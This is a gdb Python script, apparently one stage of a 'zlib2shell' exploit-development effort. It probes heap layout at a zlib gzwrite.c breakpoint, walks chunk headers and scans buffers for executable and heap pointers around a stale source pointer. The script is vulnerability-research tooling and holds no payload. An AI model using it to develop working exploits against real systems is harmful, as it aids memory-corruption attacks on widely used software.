# zlib2shell W2 — gdb commands for the heap-layout probe.
# Sourced at the gzwrite.c:389 breakpoint (before gz_vacate's memmove).
python
import gdb, struct
inf = gdb.selected_inferior()
pid = inf.pid
state = int(gdb.parse_and_eval("(void *)state"))
inb = int(gdb.parse_and_eval("(void *)state->in"))
out = int(gdb.parse_and_eval("(void *)state->out"))
dstate = int(gdb.parse_and_eval("(void *)state->strm.state"))
src = int(gdb.parse_and_eval("(void *)strm->next_in"))
avail = int(gdb.parse_and_eval("strm->avail_in"))
exe, heap_end = [], 0
for line in open("/proc/%d/maps" % pid):
    f = line.split()
    if len(f) >= 2 and "x" in f[1]:
        a, b = [int(x, 16) for x in f[0].split("-")]
        exe.append((a, b))
    if "[heap]" in line:
        heap_end = int(f[0].split("-")[1], 16)
print("LAYOUT_STATE=0x%x IN=0x%x OUT=0x%x DEFLATE=0x%x SRC=0x%x AVAIL=%d HEAP_END=0x%x" %
      (state, inb, out, dstate, src, avail, heap_end))
p = inb
for i in range(10):
    if p + 16 >= heap_end: break
    prev, sizew = struct.unpack("<QQ", bytes(inf.read_memory(p - 16, 16)))
    sz = sizew & ~7
    tag = ""
    if p == inb: tag += " IS_IN"
    if p == out: tag += " IS_OUT"
    if p == dstate: tag += " IS_DEFLATE"
    if p == src: tag += " IS_STALE_SRC_BASE"
    print("CHUNK%d addr=0x%x size=0x%x flags=0x%x%s data=%s" %
          (i, p, sz, sizew & 7, tag, bytes(inf.read_memory(p, 16)).hex()))
    if sz < 32 or sz > 1000000: break
    p += sz
buf = bytes(inf.read_memory(inb, avail))
hits, heaplike = [], 0
for off in range(0, len(buf) - 7, 8):
    v = struct.unpack_from("<Q", buf, off)[0]
    if any(a <= v < b for a, b in exe): hits.append((off, v))
    if 0x550000000000 <= v < 0x560000000000: heaplike += 1
print("SCAN_EXE_RANGES=%d EXEC_PTR_HITS=%d HEAPLIKE_QWORDS=%d" %
      (len(exe), len(hits), heaplike))
for off, v in hits[:20]:
    print("EXEC_PTR off=%d val=0x%x" % (off, v))
end
